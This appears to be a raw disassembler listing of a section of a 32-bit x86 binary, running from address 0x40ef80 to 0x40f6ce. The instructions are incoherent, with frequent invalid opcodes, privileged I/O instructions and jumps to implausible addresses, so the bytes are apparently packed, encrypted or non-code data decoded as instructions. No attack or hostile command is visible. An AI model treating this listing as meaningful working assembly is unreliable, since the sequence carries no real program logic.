  40ef80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef81:	not    DWORD PTR [eax-0x2b]
  40ef84:	gs clc 
  40ef86:	pop    edi
  40ef87:	jnp    0x40f000
  40ef89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef8a:	pop    edi
  40ef8b:	push   edx
  40ef8c:	rcr    BYTE PTR [ecx],0xf8
  40ef8f:	sub    ecx,DWORD PTR [edi]
  40ef91:	xchg   ebp,eax
  40ef92:	jns    0x40ef14
  40ef94:	pop    ds
  40ef95:	push   ecx
  40ef96:	shl    DWORD PTR ds:0xf6f6da97,1
  40ef9c:	mov    cl,0xa7
  40ef9e:	mov    ds:0xc3915a2a,eax
  40efa3:	adc    esi,DWORD PTR [esi+0x1b26eb2f]
  40efa9:	cld    
  40efaa:	cmp    al,0xc9
  40efac:	push   DWORD PTR [ecx-0x78]
  40efaf:	cli    
  40efb0:	xchg   ebx,eax
  40efb1:	sub    eax,0x9646fd31
  40efb6:	push   0xffffff82
  40efb8:	icebp  
  40efb9:	mov    bl,BYTE PTR [ebx+0x5c]
  40efbc:	aaa    
  40efbd:	xor    eax,0xb3e30c21
  40efc2:	and    cl,BYTE PTR [ebp+0x1ca3eca0]
  40efc8:	mov    ch,0x9c
  40efca:	les    edi,FWORD PTR [edi-0x40]
  40efcd:	stc    
  40efce:	mov    DWORD PTR [eax+0x27e1d8bd],edx
  40efd4:	push   0xa1ca886a
  40efd9:	stos   BYTE PTR es:[edi],al
  40efda:	xchg   ecx,eax
  40efdb:	aam    0x45
  40efdd:	loop   0x40efa2
  40efdf:	jg     0x40f00a
  40efe1:	add    dh,dl
  40efe3:	mov    ds:0x8a9f8e9f,eax
  40efe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efe9:	pop    ebx
  40efea:	and    eax,0xa1cde2d3
  40efef:	sti    
  40eff0:	xchg   ebp,eax
  40eff1:	(bad)  
  40eff2:	int    0xc2
  40eff4:	push   ds
  40eff5:	push   0x7cd76c1a
  40effa:	or     DWORD PTR [edi],edi
  40effc:	imul   edx,DWORD PTR [ebp-0x64],0xbb76f28c
  40f003:	sub    al,0x30
  40f005:	push   ss
  40f006:	push   ebx
  40f007:	mov    ebp,0x31c3c46c
  40f00c:	mov    ebx,0xdaa2fd28
  40f011:	jmp    0x6c028dfc
  40f016:	rdmsr  
  40f018:	gs in  al,0x4b
  40f01b:	mov    bh,0x7d
  40f01d:	jno    0x40efdb
  40f01f:	sar    ah,0xdf
  40f022:	cli    
  40f023:	jne    0x40efc7
  40f025:	jle    0x40f081
  40f027:	xchg   edx,eax
  40f028:	pop    ecx
  40f029:	mov    ds:0x3f8e8514,eax
  40f02e:	or     DWORD PTR [ecx+edi*1],esp
  40f031:	outs   dx,DWORD PTR ds:[esi]
  40f032:	adc    al,0xea
  40f034:	imul   ebp,esp,0x773d7298
  40f03a:	test   dh,ah
  40f03c:	add    al,BYTE PTR [ecx-0x3e7fbed5]
  40f042:	mov    ecx,0x15e1efa8
  40f047:	loope  0x40f056
  40f049:	scas   eax,DWORD PTR es:[edi]
  40f04a:	add    DWORD PTR [ecx],ebp
  40f04c:	fcom   st(5)
  40f04e:	repnz sti 
  40f050:	xchg   esp,eax
  40f051:	(bad)  
  40f053:	jno    0x40efff
  40f055:	int    0xbc
  40f057:	dec    DWORD PTR [esi-0x289e40ae]
  40f05d:	dec    esi
  40f05e:	adc    eax,0xebfa9009
  40f063:	in     al,dx
  40f064:	mov    bl,0xa8
  40f066:	sub    esi,DWORD PTR [edi]
  40f068:	jmp    0x40f0ae
  40f06a:	nop
  40f06b:	mov    cl,0x6c
  40f06d:	and    al,0x6f
  40f06f:	mov    ebp,DWORD PTR [ebp-0x79c4083]
  40f075:	inc    eax
  40f076:	mov    esi,0x5ae2f369
  40f07b:	fs sbb al,0xdd
  40f07e:	mov    DWORD PTR [ecx+0xd],edx
  40f081:	xor    eax,0xb6c953ba
  40f086:	test   al,0xa5
  40f088:	in     al,dx
  40f089:	and    esi,DWORD PTR [edx+0x30]
  40f08c:	jg     0x40f099
  40f08e:	fstp   QWORD PTR [ebp+0x59]
  40f091:	je     0x40f098
  40f093:	in     eax,0xc3
  40f095:	mov    BYTE PTR ds:0x20a5405,dl
  40f09b:	(bad)  
  40f09c:	retf   0x4068
  40f09f:	(bad)  
  40f0a0:	rcr    BYTE PTR [ebx-0x62],1
  40f0a3:	(bad)  
  40f0a4:	xchg   esi,eax
  40f0a5:	in     al,0x54
  40f0a7:	scas   eax,DWORD PTR es:[edi]
  40f0a8:	sti    
  40f0a9:	scas   eax,DWORD PTR es:[edi]
  40f0aa:	hlt    
  40f0ab:	push   ecx
  40f0ac:	popf   
  40f0ad:	(bad)  
  40f0ae:	pusha  
  40f0af:	daa    
  40f0b0:	je     0x40f123
  40f0b2:	jg     0x40f10d
  40f0b4:	rcr    DWORD PTR [esi-0x1a],cl
  40f0b7:	xchg   edi,eax
  40f0b8:	mov    edi,esi
  40f0ba:	mov    ecx,DWORD PTR [eax+ebp*2-0x4c]
  40f0be:	sub    DWORD PTR [ebp+0x6],esp
  40f0c1:	jg     0x40f051
  40f0c3:	ja     0x40f085
  40f0c5:	inc    esi
  40f0c6:	adc    al,0xeb
  40f0c8:	pop    esi
  40f0c9:	outs   dx,DWORD PTR ds:[esi]
  40f0ca:	out    dx,al
  40f0cb:	scas   al,BYTE PTR es:[edi]
  40f0cc:	ss mov dh,0x7a
  40f0cf:	rcl    dh,1
  40f0d1:	(bad)  
  40f0d2:	cmc    
  40f0d3:	mov    ch,0xd9
  40f0d5:	push   0x61d895ff
  40f0da:	je     0x40f08e
  40f0dc:	std    
  40f0dd:	aam    0xe4
  40f0df:	ins    DWORD PTR es:[edi],dx
  40f0e0:	push   ecx
  40f0e1:	push   esp
  40f0e2:	or     bh,BYTE PTR [esi+0x7d]
  40f0e5:	repz enter 0x8bc6,0xdf
  40f0ea:	and    DWORD PTR [esp+esi*2],0x4210044d
  40f0f1:	ins    BYTE PTR es:[edi],dx
  40f0f2:	adc    ebx,DWORD PTR [eax+0x41]
  40f0f5:	sub    edi,DWORD PTR [esp+edx*1+0x2]
  40f0f9:	dec    edx
  40f0fa:	jecxz  0x40f158
  40f0fc:	into   
  40f0fd:	jl     0x40f0c6
  40f0ff:	sub    DWORD PTR [edi],edx
  40f101:	shl    DWORD PTR [ebx+0x5a283c86],cl
  40f107:	xchg   esp,eax
  40f108:	xlat   BYTE PTR ds:[ebx]
  40f109:	in     al,0x83
  40f10b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f10c:	leave  
  40f10d:	out    0x7f,eax
  40f10f:	dec    edx
  40f110:	cwde   
  40f111:	sbb    BYTE PTR [ecx],cl
  40f113:	stos   BYTE PTR es:[edi],al
  40f114:	jno    0x40f180
  40f116:	out    0x72,eax
  40f118:	inc    eax
  40f119:	dec    ecx
  40f11b:	or     eax,0x55bfeca
  40f120:	ror    DWORD PTR [ebx-0x65],cl
  40f123:	fsub   DWORD PTR [ecx+ebp*2+0x686f239d]
  40f12a:	arpl   WORD PTR [ebx+eiz*4+0x3dcb5945],bp
  40f131:	pop    edi
  40f132:	stc    
  40f133:	add    bh,0x1a
  40f136:	xor    eax,0x86d997e3
  40f13b:	jl     0x40f15e
  40f13d:	cmc    
  40f13e:	mov    WORD PTR [edx],fs
  40f140:	jno    0x40f140
  40f142:	push   es
  40f143:	pop    esi
  40f144:	ret    0x1553
  40f147:	add    ax,0x7e20
  40f14b:	ret    
  40f14c:	adc    al,0x54
  40f14e:	outs   dx,DWORD PTR ds:[esi]
  40f14f:	jp     0x40f1aa
  40f151:	daa    
  40f152:	sub    BYTE PTR [edi-0x5],bh
  40f155:	js     0x40f1b8
  40f157:	xor    al,0x2c
  40f159:	inc    esi
  40f15a:	inc    esp
  40f15b:	xor    edi,edi
  40f15d:	in     al,0x9a
  40f15f:	popw   ss
  40f161:	out    0x27,al
  40f163:	int3   
  40f164:	(bad)  
  40f165:	loopne 0x40f1c5
  40f167:	fdiv   DWORD PTR [edx+0x7f]
  40f16a:	or     DWORD PTR [edx+edi*2+0x5c],ecx
  40f16e:	mov    dh,0xe0
  40f170:	mov    bh,0x31
  40f172:	mov    eax,ds:0x25b9a578
  40f177:	mov    DWORD PTR [ebx+eax*4+0x50],0x9dc06c2b
  40f17f:	int3   
  40f180:	test   eax,0x626e1fce
  40f185:	in     al,0xf2
  40f187:	outs   dx,DWORD PTR ds:[esi]
  40f188:	scas   al,BYTE PTR es:[edi]
  40f189:	mov    dh,BYTE PTR [edi+0x75]
  40f18c:	repnz leave 
  40f18e:	iret   
  40f18f:	iret   
  40f190:	jo     0x40f188
  40f192:	sbb    eax,0xf852d8a5
  40f197:	mov    DWORD PTR [edi-0x71],edi
  40f19a:	xchg   esp,eax
  40f19b:	retf   
  40f19c:	fisttp WORD PTR [ecx-0x31]
  40f19f:	rol    BYTE PTR [ecx-0x461f36dd],cl
  40f1a5:	add    edi,DWORD PTR [ebx+0xee48e30]
  40f1ab:	mov    BYTE PTR [ebx+0x6],bl
  40f1ae:	xchg   ecx,eax
  40f1af:	ret    0x86fb
  40f1b2:	pop    ecx
  40f1b3:	lods   al,BYTE PTR ds:[esi]
  40f1b4:	lock push ebp
  40f1b6:	push   ss
  40f1b7:	clc    
  40f1b8:	push   0xffffffcd
  40f1ba:	add    BYTE PTR [eax+ecx*4-0x79c5647b],dh
  40f1c1:	and    eax,0xb70355fb
  40f1c6:	stc    
  40f1c7:	repz pushf 
  40f1c9:	cmc    
  40f1ca:	xchg   edi,eax
  40f1cb:	(bad)  
  40f1cc:	test   BYTE PTR cs:[ecx+0x27c6f2b5],0xae
  40f1d4:	(bad)  
  40f1d5:	cmp    cl,cl
  40f1d7:	jmp    0x40f228
  40f1d9:	jmp    0x9bf3531f
  40f1de:	inc    ebp
  40f1df:	inc    eax
  40f1e0:	jl     0x40f1a9
  40f1e2:	sbb    ecx,DWORD PTR [ebx-0x2becb3ea]
  40f1e8:	sub    al,0xb1
  40f1ea:	imul   BYTE PTR [eax-0x561bc7db]
  40f1f0:	int3   
  40f1f1:	sub    edx,ebp
  40f1f3:	cmp    BYTE PTR [esi-0x32],bh
  40f1f6:	xor    DWORD PTR [edx+0x74],esp
  40f1f9:	mov    es,WORD PTR [edx]
  40f1fb:	and    dh,BYTE PTR [eax-0xd]
  40f1fe:	fs inc ecx
  40f200:	sub    al,0x5e
  40f202:	inc    ecx
  40f203:	jmp    0x40f282
  40f205:	jae    0x40f1af
  40f207:	inc    edi
  40f208:	pop    esp
  40f209:	pop    edi
  40f20a:	ss (bad) 
  40f20c:	repz cld 
  40f20e:	jmp    0x1283:0x13190ee
  40f215:	out    0xcd,al
  40f217:	mov    ah,0x37
  40f219:	lods   eax,DWORD PTR ds:[esi]
  40f21a:	out    0xb4,al
  40f21c:	shl    DWORD PTR [eax+0x5a639257],cl
  40f222:	jns    0x40f286
  40f224:	test   eax,0x75231480
  40f229:	push   cs
  40f22a:	dec    eax
  40f22b:	rcr    BYTE PTR [eax-0x4ff579a6],cl
  40f231:	adc    eax,0xa54248d3
  40f236:	mov    al,ds:0x7424827a
  40f23b:	out    0x8,al
  40f23d:	int3   
  40f23e:	sbb    BYTE PTR [eax+0x778a2d9b],0xc1
  40f245:	jne    0x40f272
  40f247:	mov    bl,ch
  40f249:	stos   DWORD PTR es:[edi],eax
  40f24a:	aam    0xa3
  40f24c:	mov    dl,0x26
  40f24e:	inc    edi
  40f24f:	inc    eax
  40f250:	gs jp  0x40f267
  40f253:	int3   
  40f254:	push   ss
  40f255:	shl    bh,0x7a
  40f258:	adc    al,0x41
  40f25a:	mov    ah,0x4e
  40f25c:	xchg   edi,eax
  40f25d:	cs mov ebx,0x3add7134
  40f263:	pop    eax
  40f264:	shl    BYTE PTR [ebx],0xac
  40f267:	mov    bl,BYTE PTR [ebp-0x33]
  40f26a:	lods   eax,DWORD PTR ds:[esi]
  40f26b:	mov    ds:0xe286811,eax
  40f270:	stos   DWORD PTR es:[edi],eax
  40f271:	push   esp
  40f272:	pop    ss
  40f273:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f274:	lds    esp,FWORD PTR [eax-0x1f]
  40f277:	shl    ebp,cl
  40f279:	and    DWORD PTR [eax+0x72],edi
  40f27c:	dec    esi
  40f27d:	xchg   edx,eax
  40f27e:	bound  edi,QWORD PTR [ebp-0x71]
  40f281:	pop    ebx
  40f282:	sub    al,0x4a
  40f284:	mov    edi,0xde4337d2
  40f289:	or     DWORD PTR [eax-0x491bb30f],0x900c7bf5
  40f293:	pop    esp
  40f294:	dec    eax
  40f295:	in     eax,0x8b
  40f297:	pop    ebx
  40f298:	push   0xd1bdd780
  40f29d:	addr16 fwait
  40f29f:	push   ebx
  40f2a0:	shl    ah,cl
  40f2a2:	gs sahf 
  40f2a4:	fs push ss
  40f2a6:	cdq    
  40f2a7:	retf   0x16b9
  40f2aa:	jo     0x40f24d
  40f2ac:	inc    esp
  40f2ad:	sub    BYTE PTR [ecx+0x45a38307],al
  40f2b3:	cmp    bh,dl
  40f2b5:	outs   dx,BYTE PTR ds:[esi]
  40f2b6:	into   
  40f2b7:	(bad)  
  40f2b8:	dec    eax
  40f2b9:	mov    al,ds:0x522139d1
  40f2be:	push   ecx
  40f2bf:	jo     0x40f304
  40f2c1:	(bad)  
  40f2c2:	js     0x40f2e7
  40f2c4:	adc    BYTE PTR [ebx],0x24
  40f2c7:	sub    dh,BYTE PTR [ecx-0x16582e20]
  40f2cd:	(bad)  
  40f2ce:	pop    eax
  40f2cf:	in     al,0x99
  40f2d1:	xor    eax,0x222a8ec6
  40f2d6:	sub    ecx,edx
  40f2d8:	xor    ebp,DWORD PTR [esi+0x3f66c836]
  40f2de:	or     eax,DWORD PTR [edx]
  40f2e0:	enter  0xd23a,0x17
  40f2e4:	mov    ebp,0x5b474a84
  40f2e9:	mov    esp,0xc765ea93
  40f2ee:	adc    BYTE PTR [ebx],dh
  40f2f0:	(bad)
  40f2f3:	xchg   edx,eax
  40f2f4:	jmp    0x82e5:0x1ac27c16
  40f2fb:	xor    DWORD PTR [ebx+0x22d57fee],0x4b
  40f302:	pop    ecx
  40f303:	and    ah,BYTE PTR [edi+ebx*1]
  40f306:	mov    ebx,0x8da97c77
  40f30b:	xor    BYTE PTR [edx+0x33],bl
  40f30e:	fprem1 
  40f310:	and    ecx,0x64e87f02
  40f316:	ret    
  40f317:	xor    ch,cl
  40f319:	test   eax,0x5e9f988
  40f31e:	neg    ecx
  40f320:	jbe    0x40f357
  40f322:	retf   0xf25d
  40f325:	cmp    edi,DWORD PTR [edx+0x26]
  40f328:	loop   0x40f340
  40f32a:	leave  
  40f32b:	out    0x53,eax
  40f32d:	xchg   ch,bl
  40f32f:	ja     0x40f38d
  40f331:	and    al,0x2d
  40f333:	add    BYTE PTR [edi],bh
  40f335:	into   
  40f336:	jmp    0x40f2fe
  40f338:	mov    dh,0x9f
  40f33a:	(bad)  
  40f33b:	retf   0xd3e9
  40f33e:	inc    eax
  40f33f:	mov    WORD PTR [ecx+eiz*8+0x0],fs
  40f343:	or     ch,ch
  40f345:	add    al,0x2f
  40f347:	rcl    al,cl
  40f349:	jmp    DWORD PTR [edi+ebx*1-0x63]
  40f34d:	in     al,0x3c
  40f34f:	mov    eax,0x911c91fc
  40f354:	mov    eax,ds:0x29d7fded
  40f359:	sbb    DWORD PTR [ecx-0x5b],0xffffffca
  40f35d:	lods   al,BYTE PTR cs:[esi]
  40f35f:	inc    ebx
  40f360:	pcmpeqd mm4,QWORD PTR [ecx]
  40f363:	xor    eax,0x74583e28
  40f368:	in     al,dx
  40f369:	adc    cl,dh
  40f36b:	mov    bl,0x5a
  40f36d:	inc    esp
  40f36e:	jns    0x40f3ed
  40f370:	fstp   QWORD PTR ds:0x7cb99a45
  40f376:	xor    ecx,DWORD PTR [edi+ecx*2+0x67f04748]
  40f37d:	cld    
  40f37e:	xor    BYTE PTR [ebx-0x68e68d3c],bl
  40f384:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f385:	mov    al,0x75
  40f387:	cmp    DWORD PTR gs:[edi+0x6487d9e5],esp
  40f38e:	add    al,0xc4
  40f390:	nop
  40f391:	mov    ch,0xf9
  40f393:	loopne 0x40f31f
  40f395:	enter  0xfc92,0xe
  40f399:	mov    esp,0x87e1fce8
  40f39e:	leave  
  40f39f:	out    dx,al
  40f3a0:	add    esp,DWORD PTR [edx-0x266b068e]
  40f3a6:	jbe    0x40f373
  40f3a8:	and    bl,cl
  40f3aa:	sti    
  40f3ab:	pop    es
  40f3ac:	sar    dl,cl
  40f3ae:	shl    DWORD PTR [esi],1
  40f3b0:	jmp    0x82a43821
  40f3b5:	xchg   BYTE PTR [edx+ebp*1-0x8],cl
  40f3b9:	sti    
  40f3ba:	pop    ebp
  40f3bb:	jp     0x40f428
  40f3bd:	xor    DWORD PTR [ebp-0x241da874],eax
  40f3c3:	in     eax,0x4f
  40f3c5:	retf   0x4362
  40f3c8:	ds call 0xcad49fe1
  40f3ce:	dec    esi
  40f3cf:	mov    ch,0xfb
  40f3d1:	outs   dx,BYTE PTR ds:[esi]
  40f3d2:	inc    ebp
  40f3d3:	lods   al,BYTE PTR ds:[esi]
  40f3d4:	mov    ebx,0x9202b8aa
  40f3d9:	mov    bh,0x7f
  40f3db:	popa   
  40f3dc:	out    0x4,al
  40f3de:	leave  
  40f3df:	jnp    0x40f433
  40f3e1:	xchg   ebx,eax
  40f3e2:	(bad)  
  40f3e3:	lods   al,BYTE PTR ds:[esi]
  40f3e4:	loopne 0x40f391
  40f3e6:	or     esi,esi
  40f3e8:	out    dx,eax
  40f3e9:	pop    edi
  40f3ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3eb:	call   0x68237330
  40f3f0:	push   esp
  40f3f1:	cmp    al,0x89
  40f3f3:	inc    esi
  40f3f4:	outs   dx,DWORD PTR ds:[esi]
  40f3f5:	mov    ah,0x60
  40f3f7:	adc    DWORD PTR [edx],eax
  40f3f9:	lods   eax,DWORD PTR ds:[esi]
  40f3fa:	push   cs
  40f3fb:	lods   eax,DWORD PTR ds:[esi]
  40f3fc:	jb     0x40f464
  40f3fe:	dec    ebx
  40f3ff:	iret   
  40f400:	and    al,0x23
  40f402:	mov    eax,0x36cf947e
  40f407:	pop    esp
  40f408:	inc    esp
  40f409:	adc    dh,0xf
  40f40c:	popa   
  40f40d:	sbb    al,dl
  40f40f:	adc    eax,0xf9f62ae0
  40f414:	out    0xa2,eax
  40f416:	call   0x7bebf281
  40f41b:	scas   al,BYTE PTR es:[edi]
  40f41c:	push   ss
  40f41d:	jno    0x40f482
  40f41f:	outs   dx,BYTE PTR ds:[esi]
  40f420:	jl     0x40f3fe
  40f422:	fsub   st,st(0)
  40f424:	xor    DWORD PTR [edi-0x5bbbbf0e],esp
  40f42a:	mov    eax,0x4f105779
  40f42f:	mov    bl,0xc5
  40f431:	mov    al,0x86
  40f433:	or     eax,0xafeafe21
  40f438:	xchg   ebp,edx
  40f43a:	cmp    al,0xee
  40f43c:	mov    al,0xe9
  40f43e:	xchg   al,dl
  40f440:	push   ebp
  40f441:	pusha  
  40f442:	retf   
  40f443:	mov    ebp,0xe7c342cf
  40f448:	mov    ah,0x2d
  40f44a:	sbb    ecx,edi
  40f44c:	jno    0x40f4ae
  40f44e:	jge    0x40f477
  40f450:	pop    edx
  40f451:	sub    BYTE PTR [esi-0x57],cl
  40f454:	fucompp 
  40f456:	or     BYTE PTR [esi-0x28f4096d],0x62
  40f45d:	into   
  40f45e:	lods   al,BYTE PTR ds:[esi]
  40f45f:	lods   al,BYTE PTR ds:[esi]
  40f460:	ret    0x7756
  40f463:	or     al,0x44
  40f465:	jge    0x40f461
  40f467:	inc    esp
  40f468:	enter  0xf37a,0x5f
  40f46c:	jge    0x40f4bf
  40f46e:	fiadd  WORD PTR [eax+0x1b]
  40f471:	and    BYTE PTR [eax],bl
  40f473:	dec    ebp
  40f474:	mov    al,ds:0x5f28b6c9
  40f479:	gs cdq 
  40f47b:	aam    0x44
  40f47d:	pop    ebx
  40f47e:	(bad)  
  40f47f:	and    al,0x72
  40f481:	ds pushf 
  40f483:	rcl    DWORD PTR [ecx-0x10],cl
  40f486:	pop    esi
  40f487:	add    cl,BYTE PTR [ebp-0x57f6307c]
  40f48d:	out    dx,al
  40f48e:	call   DWORD PTR [edi]
  40f490:	mov    edx,DWORD PTR [ecx-0x34819c9f]
  40f496:	sbb    ebp,edi
  40f498:	add    eax,0x11fdce4c
  40f49d:	retf   0xab6d
  40f4a0:	push   edx
  40f4a1:	sbb    al,0x63
  40f4a3:	sub    ch,BYTE PTR [edi+0x63]
  40f4a6:	and    eax,0x90a57ab7
  40f4ab:	push   0x1db7a387
  40f4b0:	and    BYTE PTR [ebx+0x957b3f6],ah
  40f4b6:	add    dh,BYTE PTR [ebx]
  40f4b8:	inc    esp
  40f4b9:	push   es
  40f4ba:	pop    esi
  40f4bb:	sbb    ch,BYTE PTR ds:0x8c1fe82a
  40f4c1:	ins    DWORD PTR es:[edi],dx
  40f4c2:	mov    al,ds:0x40195667
  40f4c7:	mov    eax,ds:0xbf68baa
  40f4cc:	aas    
  40f4cd:	push   ebp
  40f4ce:	push   0x70
  40f4d0:	sub    BYTE PTR [ecx],al
  40f4d2:	and    ecx,ebx
  40f4d4:	inc    ecx
  40f4d5:	xor    DWORD PTR [ebp+edi*2-0x73],esp
  40f4d9:	ins    BYTE PTR es:[edi],dx
  40f4da:	retf   0x3f8e
  40f4dd:	and    bh,al
  40f4df:	icebp  
  40f4e0:	inc    edx
  40f4e1:	adc    ecx,DWORD PTR [ebx+0x4a0197f5]
  40f4e7:	add    BYTE PTR [ecx],0xec
  40f4ea:	stc    
  40f4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4ec:	cmp    esp,edx
  40f4ee:	push   eax
  40f4ef:	push   es
  40f4f0:	(bad)  
  40f4f1:	sbb    eax,0x48767442
  40f4f6:	and    eax,0x29cb62bc
  40f4fb:	cs icebp 
  40f4fd:	push   ebp
  40f4fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4ff:	int    0xd2
  40f501:	jecxz  0x40f577
  40f503:	push   cs
  40f504:	ins    BYTE PTR es:[edi],dx
  40f505:	mov    ch,0x5c
  40f507:	or     DWORD PTR [edx+0x72],ebx
  40f50a:	jecxz  0x40f4a8
  40f50c:	repnz inc ebx
  40f50e:	xor    ebp,edx
  40f510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f511:	neg    BYTE PTR [ebx-0x2fa53342]
  40f517:	pushf  
  40f518:	mov    ecx,0x86fe32b8
  40f51d:	push   ds
  40f51e:	mov    DWORD PTR [ebp+0x14],0xa52052ba
  40f525:	xlat   BYTE PTR ds:[ebx]
  40f526:	adc    BYTE PTR [edi+0x44],0xc4
  40f52a:	mov    BYTE PTR [esi-0x3c],al
  40f52d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f52e:	xor    BYTE PTR [esi-0x2558366d],al
  40f534:	xchg   esi,eax
  40f535:	(bad)  
  40f536:	into   
  40f537:	jl     0x40f538
  40f539:	gs scas eax,DWORD PTR es:[edi]
  40f53b:	mov    ecx,0xa4f166df
  40f540:	outs   dx,BYTE PTR ds:[esi]
  40f541:	xchg   edi,eax
  40f542:	mov    edi,0x5bb04bb1
  40f547:	xchg   esi,eax
  40f548:	(bad)  
  40f549:	or     cl,BYTE PTR [ebx-0x2]
  40f54c:	stc    
  40f54d:	outs   dx,BYTE PTR ds:[esi]
  40f54e:	data16 aad 0x5c
  40f551:	leave  
  40f552:	xor    BYTE PTR [esi-0x6c12d732],cl
  40f558:	mov    DWORD PTR [ecx+0x707e51d6],ebp
  40f55e:	adc    eax,0x53dd9c1f
  40f563:	in     al,dx
  40f564:	loop   0x40f58c
  40f566:	js     0x40f59d
  40f568:	add    DWORD PTR [bp-0x7f],edi
  40f56c:	mov    ds,WORD PTR [ebx-0x63]
  40f56f:	lahf   
  40f570:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f571:	imul   edi,DWORD PTR [esi+edi*2-0x17],0xffffffca
  40f576:	push   esi
  40f577:	sbb    eax,0xc2a08a31
  40f57c:	dec    esi
  40f57d:	add    DWORD PTR [esi+ecx*8+0x66],esp
  40f581:	out    dx,eax
  40f582:	push   ebp
  40f583:	push   ebp
  40f584:	dec    ebx
  40f585:	aad    0xef
  40f587:	leave  
  40f588:	cdq    
  40f589:	das    
  40f58a:	push   ebp
  40f58b:	daa    
  40f58c:	and    eax,DWORD PTR [ebx-0x3cf9b813]
  40f592:	mov    ds:0x59b67a45,eax
  40f597:	popf   
  40f598:	das    
  40f599:	fs push edi
  40f59b:	idiv   BYTE PTR [edx]
  40f59d:	hlt    
  40f59e:	adc    ebp,DWORD PTR [edi+edi*1+0x43cfe2a1]
  40f5a5:	js     0x40f5c9
  40f5a7:	in     eax,dx
  40f5a8:	leave  
  40f5a9:	aad    0xd5
  40f5ab:	js     0x40f5c8
  40f5ad:	pop    edx
  40f5ae:	cmp    DWORD PTR [eax-0x33],esp
  40f5b1:	mov    BYTE PTR [esi],ah
  40f5b3:	inc    ebp
  40f5b4:	call   0x7a2:0xccb02733
  40f5bb:	adc    BYTE PTR [ecx-0x1f415e88],bh
  40f5c1:	mov    WORD PTR [ebp+0x55ee960a],es
  40f5c7:	push   ds
  40f5c8:	mov    ds:0x45aa220c,al
  40f5cd:	fidivr WORD PTR [ecx-0x2956cc5f]
  40f5d3:	mov    ecx,0x5e0d980a
  40f5d8:	fwait
  40f5d9:	cwde   
  40f5da:	js     0x40f5ab
  40f5dc:	mov    dh,0x80
  40f5de:	mov    cl,0xfd
  40f5e0:	shl    DWORD PTR [eax+eax*4],1
  40f5e3:	cmc    
  40f5e4:	fadd   QWORD PTR [edx-0x78edf7f1]
  40f5ea:	adc    eax,0xda018b72
  40f5ef:	popf   
  40f5f0:	cmp    eax,0x97eedc6f
  40f5f5:	hlt    
  40f5f6:	pop    edi
  40f5f7:	stc    
  40f5f8:	mov    edx,0x42beb6d1
  40f5fd:	sbb    al,0xf9
  40f5ff:	push   0x6a
  40f601:	fsubr  st,st(7)
  40f603:	lods   eax,DWORD PTR ds:[esi]
  40f604:	cld    
  40f605:	pop    ecx
  40f606:	fadd   DWORD PTR [esi+0x70]
  40f609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f60a:	call   0x5665:0x9f28bdca
  40f611:	arpl   sp,sp
  40f613:	inc    edi
  40f614:	jo     0x40f626
  40f616:	fnstsw WORD PTR [edi]
  40f618:	dec    ecx
  40f619:	aad    0x85
  40f61b:	(bad)  
  40f61c:	jnp    0x40f62f
  40f61e:	call   0x9181cec6
  40f623:	xor    ebx,DWORD PTR [ecx+0x66825eb]
  40f629:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	es in  eax,0xe9
  40f62e:	jp     0x40f633
  40f630:	fwait
  40f631:	ja     0x40f6a1
  40f633:	sub    al,al
  40f635:	jecxz  0x40f5ff
  40f637:	or     eax,0x352de897
  40f63c:	ss inc ecx
  40f63e:	sub    al,0xb6
  40f640:	mov    esp,0xfb117c8b
  40f645:	mov    dl,0xb9
  40f647:	cld    
  40f648:	test   DWORD PTR [eax],edi
  40f64a:	sar    DWORD PTR [edi+0x683a8d6a],cl
  40f650:	pop    ecx
  40f651:	push   ecx
  40f652:	mov    ah,0x9d
  40f654:	dec    edx
  40f655:	jl     0x40f678
  40f657:	sbb    DWORD PTR [ecx],esi
  40f659:	test   al,0x52
  40f65b:	in     eax,dx
  40f65c:	dec    eax
  40f65d:	sbb    eax,0x91e537c0
  40f662:	sub    ebx,DWORD PTR [edi+esi*1-0x2a]
  40f666:	mov    cl,0x80
  40f668:	in     eax,dx
  40f669:	push   0x87cccd3e
  40f66e:	xchg   ebx,eax
  40f66f:	mov    esp,DWORD PTR [ebx-0x4d]
  40f672:	into   
  40f673:	xchg   ebp,eax
  40f674:	push   ds
  40f675:	adc    BYTE PTR [edx+edi*2+0x839a2a2],bl
  40f67c:	sub    DWORD PTR [edx],edi
  40f67e:	pop    ebp
  40f67f:	inc    eax
  40f680:	inc    edi
  40f681:	adc    DWORD PTR [ecx-0x63],ebp
  40f684:	(bad)  
  40f685:	pop    ecx
  40f686:	xchg   ebp,eax
  40f687:	sbb    eax,0x9bda7a78
  40f68c:	add    al,0x60
  40f68e:	mov    ebp,0xe97e6d5d
  40f693:	mov    al,ds:0x183964f1
  40f698:	fs jp  0x40f6c6
  40f69b:	pop    eax
  40f69c:	daa    
  40f69d:	jmp    0x7b8514e1
  40f6a2:	enter  0x88e0,0x87
  40f6a6:	pop    ss
  40f6a7:	je     0x40f6b1
  40f6a9:	dec    ebp
  40f6aa:	jae    0x40f66c
  40f6ac:	push   ebx
  40f6ad:	push   cs
  40f6ae:	pop    edx
  40f6af:	lds    eax,FWORD PTR [ebp+0x19]
  40f6b2:	ret    0x65c3
  40f6b5:	sbb    DWORD PTR [edx],ecx
  40f6b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6b8:	add    bh,ch
  40f6ba:	sbb    al,0xed
  40f6bc:	pop    esp
  40f6bd:	sub    BYTE PTR [esi-0xaa961d0],cl
  40f6c3:	cld    
  40f6c4:	sub    BYTE PTR [ebp+0x6c],bh
  40f6c7:	inc    ecx
  40f6c8:	popf   
  40f6c9:	cmp    BYTE PTR [edx+0x64],bh
  40f6cc:	jno    0x40f73a
  40f6ce:	xchg   edx,eax
